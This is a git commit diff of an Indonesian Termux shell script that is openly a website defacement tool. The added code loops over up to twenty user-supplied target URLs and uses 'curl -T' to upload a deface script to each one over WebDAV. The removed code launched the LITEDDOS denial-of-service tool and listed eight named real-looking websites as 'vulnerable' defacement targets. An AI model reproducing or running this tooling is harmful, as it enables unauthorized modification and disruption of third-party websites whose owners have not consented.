17426ebed0b77480d22430774e8b296cc1f850a9
bahauddinkondang <40339833+bahauddinkondang@users.noreply.github.com>
2018-11-22 10:35:09 +0700

    gjgg
    gug

--- tool2.sh
+++ tool2.sh
@@ -1,75 +1,142 @@
-#!/system/xbin/bash
-#Author InYouDfv47
-#Selamat Belajar
-
-clear
 blue='\033[34;1m'
 green='\033[32;1m'  
 purple='\033[35;1m'
 cyan='\033[36;1m'
 red='\033[31;1m'
-white='\033[37;1m'    
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
 
-figlet Bahauddin | lolcat
-echo $cyan"Membuat Tools Instaler Sendiri Di Termux"
-echo $green"Daftar Toolsnya=>"
-echo $purple"[1] DDOS Website Dengan LITEDDOS"
-echo $purple"[2] iesDeface"
+toilet -f standard " InYourDfv47 " -F gay
 echo
-echo $green
-read -p "╭─[Pilih Nomer]
-╰─root@Dfv47=•>" bro
-
-if [ $bro = 1 ] || [ $bro = 1 ]
-then
-clear
-echo $green"Installing LITEDDOS..."
+echo ""
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
+echo $yellow"|  [Version     ]: Deface Multi Brute Webdav  °       °  |"
+echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
+echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
+echo $purple"|  °      °	   [Thanks To All Member]     °          |"
+echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
+echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
+echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
+echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
 sleep 1
-apt update
-apt install git
-git clone https://github.com/4L13199/LITEDDOS
-mv LITEDDOS $HOME
-cd $HOME/LITEDDOS
-read -p "MasukanTarget:" target
-python2 LITEDDOS.py target 80 100
-fi
+echo
 
-if [ $bro = 2 ] || [ $bro = 2 ]
-then
-clear
-figlet " Bahauddin " | lolcat
-sleep 1 
-apt install git
-apt install bash
-pip2 install bash
-git clone https://github.com/ALX-04/iesDEFACE
-mv iesDEFACE $HOME
-cd $HOME/iesDEFACE
-bash iesDeface.sh
-fi
+echo $red"_ ▂ ▄ ▅ ▆ ▆ ▆ [ MULTI BRUTE DEFACE WEBDAV ] ▆ ▆ ▆ ▆ ▅ ▄ ▂ _"
+echo
+echo $white"*Taruh Script Di Luar Folder*"
+echo $red"[+]====================================================[+]"
+echo $white"Masukan nama script"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke2 "
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke6"
+read -p "[=======>" Ke6
+curl -T /storage/emulated/0/$script $Ke6
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke7"
+read -p "[=======>" Ke7
+curl -T /storage/emulated/0/$script $Ke7
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke8"
+read -p "[=======>" Ke8
+curl -T /storage/emulated/0/$script $Ke8
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke9"
+read -p "[=======>" Ke9
+curl -T /storage/emulated/0/$script $Ke9
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke10"
+read -p "[=======>" Ke10
+curl -T /storage/emulated/0/$script $Ke10
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke11"
+read -p "[=======>" Ke11
+curl -T /storage/emulated/0/$script $Ke11
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke12 "
+read -p "[=======>" Ke12
+curl -T /storage/emulated/0/$script $Ke12
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke13"
+read -p "[=======>" Ke13
+curl -T /storage/emulated/0/$script $Ke13
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke14"
+read -p "[=======>" Ke14
+curl -T /storage/emulated/0/$script $Ke14
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke15"
+read -p "[=======>" Ke15
+curl -T /storage/emulated/0/$script $Ke15
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke16"
+read -p "[=======>" Ke16
+curl -T /storage/emulated/0/$script $Ke16
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke17"
+read -p "[=======>" Ke17
+curl -T /storage/emulated/0/$script $Ke17
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke18"
+read -p "[=======>" Ke18
+curl -T /storage/emulated/0/$script $Ke18
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke19"
+read -p "[=======>" Ke19
+curl -T /storage/emulated/0/$script $Ke19
+echo $red"[+]====================================================[+]"
+echo $white"Masukan Web Target Ke20"
+read -p "[=======>" Ke20
+curl -T /storage/emulated/0/$script $Ke20
+echo $red"[+]====================================================[+]"
+echo
+sleep 1
 
-if [ $bro = 44 ] || [ $bro = 44 ]
-then
-clear
-echo "\033[34;1m"
-cowsay -f kiss.cow "Bahauddin" | lolcat
-figlet -f slant Bahauddin
-echo "\033[37;1m"
-echo "Masukan Web target"
-echo "Contoh Web Target vuln"
-echo "	http://bestilling.udir.no/"
-echo "	http://560560.ru/"
-echo "	http://myownemailer.com/"
-echo "	http://Zoocentral.co.za/"
-echo "	http://50-50-50.ru/"
-echo "	http://tirupurjobs.net/"
-echo "	http://Matrimony.co.za/"
-echo "	http://Bheh.co.za/"
-read -p "[Bahauddin]>" target
-echo "Masukan Nama script kalian"
-echo "yang ada di Luar Folder Ruang Penyimpanan"
-read -p "[Bahauddin]>" script
-curl -T /storage/emulated/0/$script $target
-echo "\033[33;1m"
-echo "Selesai! Tod Cek di $target $script "
-fi
+echo $red"_ ▂ ▄ ▅ ▆ ▆ ▆ ▆ ▆ [ Sedang Proses ] ▆ ▆ ▆ ▆ ▆ ▆ ▅ ▄ ▂ _"
+echo $white
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo "Silahkan Cek Web $Ke6/$script"
+echo "Silahkan Cek Web $Ke7/$script"
+echo "Silahkan Cek Web $Ke8/$script"
+echo "Silahkan Cek Web $Ke9/$script"
+echo "Silahkan Cek Web $Ke10/$script"
+echo "Silahkan Cek Web $Ke11/$script"
+echo "Silahkan Cek Web $Ke12/$script"
+echo "Silahkan Cek Web $Ke13/$script"
+echo "Silahkan Cek Web $Ke14/$script"
+echo "Silahkan Cek Web $Ke15/$script"
+echo "Silahkan Cek Web $Ke16/$script"
+echo "Silahkan Cek Web $Ke17/$script"
+echo "Silahkan Cek Web $Ke18/$script"
+echo "Silahkan Cek Web $Ke19/$script"
+echo "Silahkan Cek Web $Ke20/$script"
+
+echo
+echo $white"*Jika Gagal Berarti Gak Vuln Itu Web*"
+echo
+echo $red"_ ▂ ▄ ▆ ▆ ▆ ▆ [ Greets To : SMA N 1 Simo ] ▆ ▆ ▆ ▆ ▅ ▄ ▂ _"
